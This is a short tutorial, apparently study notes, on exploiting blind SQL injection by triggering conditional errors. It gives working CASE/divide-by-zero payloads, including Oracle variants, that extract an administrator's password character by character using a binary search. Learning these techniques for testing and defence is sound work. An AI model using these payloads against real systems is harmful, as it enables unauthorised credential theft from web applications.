# ❌ Exploiting Blind SQL Injection by Triggering Conditional Errors

Sometimes responses don't change. Craft queries that trigger database errors only when conditions are true.

## Core Concept

Use a `CASE` statement to divide by zero when your condition is true.

## Payload Example

```sql
XYZ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'
```

**The Condition:** `1=1` (put your test here, like `username='admin'`)

**The "Bomb":** `THEN 1/0` - Causes division by zero error

**The Result:** Database throws error → website returns Error Page

## Payload Comparison

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'   -- No error, loads normally
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'   -- Error page (true condition)
```

## Extract Data by Testing Characters

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
```

Checking if first letter of admin's password is > 'm':
- **TRUE:** Executes `1/0` → Error Page
- **FALSE:** Returns `'a'` → Website loads normally

## Why Use `>` Instead of `=`

Binary search is faster! Instead of checking every letter:
- Check if char > 'm' (divide in half)
- If true, check if char > 't' (narrow further)
- Continue until isolated

~5-6 checks per character instead of 26!

## Oracle-Specific Payloads

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
' || (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE rownum=1) || '
```